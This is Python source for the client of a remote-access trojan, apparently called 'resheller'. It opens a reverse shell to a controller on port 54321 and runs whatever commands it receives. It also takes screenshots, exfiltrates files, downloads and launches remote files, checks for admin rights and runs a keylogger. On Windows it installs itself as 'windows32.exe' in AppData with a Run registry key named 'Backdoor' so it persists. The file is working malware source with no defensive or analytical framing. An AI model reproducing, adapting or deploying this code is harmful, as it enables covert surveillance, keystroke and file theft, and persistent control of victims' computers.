#!/usr/bin/env python
from base64 import b64encode
from os import chdir, environ, path, remove, listdir, name
from shutil import copyfile
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, call
from sys import executable, exit
from threading import Thread
from time import sleep

from mss import mss
from requests import get
from resheller.src.client.ip import get_ip

from resheller.src.client.keylogger import KeyLogger
from resheller.src.server.pipe import SafeSocket
from resheller.src.stdout.output import usage


class ReverseShell(KeyLogger):
    """Initiate backdoor and socket variable"""

    def __init__(self):
        super().__init__()
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.safe_sock = SafeSocket(self.sock)

    def connect(self):
        ip = get_ip()
        while True:
            sleep(20)
            try:
                self.sock.connect((ip, 54321))
                self.shell()
            except ConnectionRefusedError:
                self.connect()

    def is_admin(self):
        payload = '[!] Cannot Perform Check\n'
        try:
            if name == "nt":
                try:
                    system_root = environ.get('SystemRoot', 'C:\\Windows')
                    _ = listdir(path.sep.join([system_root, 'temp']))
                    payload = "[+] Running as Admin"
                except PermissionError:
                    payload = "[!] Running as User"
            else:
                try:
                    # noinspection PyUnresolvedReferences
                    import os.geteuid
                    if os.geteuid() == 0:
                        payload = "[+] Running as root"
                    else:
                        payload = "[!] Running as user"
                except ImportError:
                    pass
        except ValueError:
            pass
        self.safe_sock.send(payload)

    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
            with open("monitor-1.png", "rb") as image:
                image = b64encode(image.read())
                payload = image.decode("utf-8")
            remove("monitor-1.png")
        except ValueError:
            payload = "\n[!] Failed to Take Screenshot\n"
        self.safe_sock.send(payload)

    def download(self, command):
        with open(command[9:], 'rb') as file:
            result = b64encode(file.read())
            payload = result.decode("utf-8")
            self.safe_sock.send(payload)

    def get_request(self, command):
        try:
            url = command[4:]
            get_response = get(url)
            file_name = url.split('/')[-1]
            with open(file_name, 'wb') as out_file:
                out_file.write(get_response.content)
            payload = f'[+] Downloaded "{file_name} to Target'
        except ValueError:
            payload = "[!] Failed to Downloaded File"
        self.safe_sock.send(payload)

    def start(self, command):
        try:
            Popen(command[6:], shell=True)
            payload = f"[+] Started {command[6:]}"
        except ValueError:
            payload = f"[!] Failed to Start {command[6:]}"
        self.safe_sock.send(payload)

    def return_proc(self, command):
        proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout = proc.stdout.read() + proc.stderr.read()
        payload = stdout.decode("utf-8")
        self.safe_sock.send(payload)

    def keylogger(self, command):
        if command[10:] == 'start':
            t1 = Thread(target=self.listen)
            t1.start()
            payload = "[+] Started Keylogger"
        elif command[10:] == 'dump':
            payload = "[!] No Logs Found\n"
            if path.isfile(self.log_path):
                with open(self.log_path) as log_file:
                    payload = log_file.read()
                    log_file.close()
                remove(self.log_path)
        else:
            payload = usage(session=False, keylogger=True)
        self.safe_sock.send(payload)

    def change_dir(self, command):
        try:
            chdir(command[3:])
            payload = "[+]"
        except (FileNotFoundError, OSError):
            payload = "[!] Directory Not Found"
        self.safe_sock.send(payload)

    def shell(self):
        windows = (name == "nt")
        while True:
            command = self.safe_sock.recv()
            if command == "get_os":
                self.safe_sock.send(windows)
            elif command == "exit":
                self.sock.close()
                break
            elif command[:2] == 'cd' and len(command) > 2:
                if command == "cd ~":
                    command = f"cd {path.expanduser('~')}"
                self.change_dir(command)
            elif command[:8] == "download":
                self.download(command)
            elif command[:7] == "get_url":
                self.get_request(command)
            elif command == "screenshot":
                self.screenshot()
            elif command[:5] == "start":
                self.start(command)
            elif command[:5] == "check":
                self.is_admin()
            elif command[:9] == "keylogger":
                self.keylogger(command)
            elif command == "help":
                return usage()
            else:
                self.return_proc(command)


def backdoor():
    location = f'{environ["appdata"]}\\windows32.exe'
    if not path.exists(location):
        copyfile(executable, location)
        call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\'
             f'Run /v Backdoor /t REG_SZ /d {location}', shell=True)


def main():
    if name == "nt":
        backdoor()
    ReverseShell().connect()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
